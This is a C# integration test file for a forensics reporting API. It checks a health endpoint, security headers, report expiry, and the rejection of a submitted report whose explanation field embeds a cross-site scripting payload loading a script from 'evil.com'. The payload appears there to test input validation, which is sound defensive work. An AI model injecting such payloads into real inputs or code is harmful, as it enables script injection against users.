using System.Net;
using System.Net.Http.Json;
using FluentAssertions;
using Microsoft.Extensions.DependencyInjection;
using MinecraftSsForensics.Api.Data;
using MinecraftSsForensics.Api.Models.Dtos.Ingestion;
using MinecraftSsForensics.Tests.Fixtures;
using Xunit;

namespace MinecraftSsForensics.Tests.Integration;

public class SecurityAndExpirationTests : IClassFixture<CustomWebApplicationFactory>
{
    private readonly CustomWebApplicationFactory _factory;
    private readonly HttpClient _client;

    public SecurityAndExpirationTests(CustomWebApplicationFactory factory)
    {
        _factory = factory;
        _client = factory.CreateClient();
    }

    [Fact]
    public async Task HealthEndpoint_ReturnsHealthyStatus()
    {
        // Act
        var response = await _client.GetAsync("/api/v1/health");

        // Assert
        response.StatusCode.Should().Be(HttpStatusCode.OK);
        var content = await response.Content.ReadAsStringAsync();
        content.Should().Contain("Healthy");
        content.Should().Contain("Minecraft SS Forensics");
    }

    [Fact]
    public async Task Response_IncludesStrictSecurityHeaders()
    {
        // Act
        var response = await _client.GetAsync("/api/v1/health");

        // Assert
        response.Headers.Contains("X-Content-Type-Options").Should().BeTrue();
        response.Headers.GetValues("X-Content-Type-Options").First().Should().Be("nosniff");
        response.Headers.Contains("X-Frame-Options").Should().BeTrue();
        response.Headers.GetValues("X-Frame-Options").First().Should().Be("DENY");
        response.Headers.Contains("Content-Security-Policy").Should().BeTrue();
    }

    [Fact]
    public async Task SubmitReport_WithProhibitedScriptToken_Returns400BadRequest()
    {
        // Arrange
        var request = SyntheticReportFactory.CreateValidReportRequest();
        request.Findings[0].Explanation = "Exploited via <script src='http://evil.com/xss.js'></script>";

        // Act
        var response = await _client.PostAsJsonAsync("/api/v1/reports", request);

        // Assert
        response.StatusCode.Should().Be(HttpStatusCode.BadRequest);
        var content = await response.Content.ReadAsStringAsync();
        content.Should().Contain("prohibited script tokens");
    }

    [Fact]
    public async Task GetReport_WhenReportIsExpired_Returns404NotFound()
    {
        // Arrange: submit a report
        var request = SyntheticReportFactory.CreateValidReportRequest();
        var submitRes = await _client.PostAsJsonAsync("/api/v1/reports", request);
        var submitData = await submitRes.Content.ReadFromJsonAsync<SubmitReportResponse>();

        // Manually expire the report in the database
        using (var scope = _factory.Services.CreateScope())
        {
            var db = scope.ServiceProvider.GetRequiredService<ForensicsDbContext>();
            var report = db.Reports.First(r => r.PublicId == submitData!.PublicId);
            report.ExpiresAt = DateTimeOffset.UtcNow.AddMinutes(-10); // Expired 10 min ago
            await db.SaveChangesAsync();
        }

        // Act
        var response = await _client.GetAsync($"/api/v1/reports/{submitData!.PublicId}");

        // Assert
        response.StatusCode.Should().Be(HttpStatusCode.NotFound);
    }
}
